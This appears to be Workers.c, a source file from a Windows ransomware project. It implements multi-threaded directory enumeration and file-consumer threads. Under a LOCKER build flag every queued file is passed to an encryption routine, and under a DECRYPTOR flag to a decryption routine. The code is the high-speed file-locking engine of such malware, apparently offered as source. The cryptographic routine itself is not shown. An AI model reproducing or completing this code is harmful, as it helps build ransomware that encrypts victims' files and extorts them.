// Workers.c
#include <windows.h>
#include "Queue.h"
#include "Common.h"
#include "Search.h"
#include "Cryptor.h"
#include "Workers.h"

#define HAS_ITEMS(Q)   ((Q).Head != NULL)

extern PVOID            g_hPrivateHeap;
extern QUEUE            g_DirQueue;
extern QUEUE            g_FileQueue;
extern LONG             g_nOutstandingDirs;
extern volatile BOOL    g_Finished;         // volatile - read/written across threads


DWORD WINAPI DirectoryWorkerThread(OPTIONAL LPVOID Context)
{
    UNREFERENCED_PARAMETER(Context);
    PQUEUE_ENTRY WorkItem;
    LONG NewCount;

    for (;;)
    {
        // Get a directory from the queue
        if ( ! (WorkItem = WaitAndDequeue(&g_DirQueue) ) )
            break;

        // Scan the directory (this adds more dirs to g_DirQueue and files to g_FileQueue)
        EnumerateDirectoryW(WorkItem->Path);

        // Cleanup the node
        HeapFree(g_hPrivateHeap, 0x00, WorkItem->Path);
        HeapFree(g_hPrivateHeap, 0x00, WorkItem);

        // Atomic decrement to see if we were the last thread working
        NewCount = InterlockedDecrement(&g_nOutstandingDirs);

        if (NewCount == 0)
        {
            // Lock only to synchronize the 'Finished' signal
            AcquireSRWLockExclusive(&g_DirQueue.Lock);

            if (!HAS_ITEMS(g_DirQueue))
            {
                g_Finished = TRUE;

                // Wake up any sleeping Directory Workers
                WakeAllConditionVariable(&g_DirQueue.NonEmpty);

                // Wake up all File Consumers
                AcquireSRWLockExclusive(&g_FileQueue.Lock);
                WakeAllConditionVariable(&g_FileQueue.NonEmpty);
                ReleaseSRWLockExclusive(&g_FileQueue.Lock);
            }

            ReleaseSRWLockExclusive(&g_DirQueue.Lock);
        }

        if (g_Finished)
            break;
    }

    return 0;
}

DWORD WINAPI FileConsumerThread(OPTIONAL LPVOID Context)
{
    UNREFERENCED_PARAMETER(Context);
    PQUEUE_ENTRY WorkItem = NULL;

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

    for (;;)
    {
        AcquireSRWLockExclusive(&g_FileQueue.Lock);

        while (!HAS_ITEMS(g_FileQueue) && !g_Finished)
        {
            SleepConditionVariableSRW(&g_FileQueue.NonEmpty, &g_FileQueue.Lock, INFINITE, 0);
        }

        QUEUE_DETACH_HEAD(WorkItem, &g_FileQueue);

        ReleaseSRWLockExclusive(&g_FileQueue.Lock);

        if (WorkItem == NULL)
        {
            if (g_Finished) 
                break;

            continue;
        }
#if   defined(LOCKER)
        EncryptSingleFileW(WorkItem->Path);
#elif defined(DECRYPTOR)   
        DecryptSingleFileW(WorkItem->Path);
#endif
        HeapFree(g_hPrivateHeap, 0, WorkItem->Path);
        HeapFree(g_hPrivateHeap, 0, WorkItem);
        WorkItem = NULL;
    }
    return 0;
}
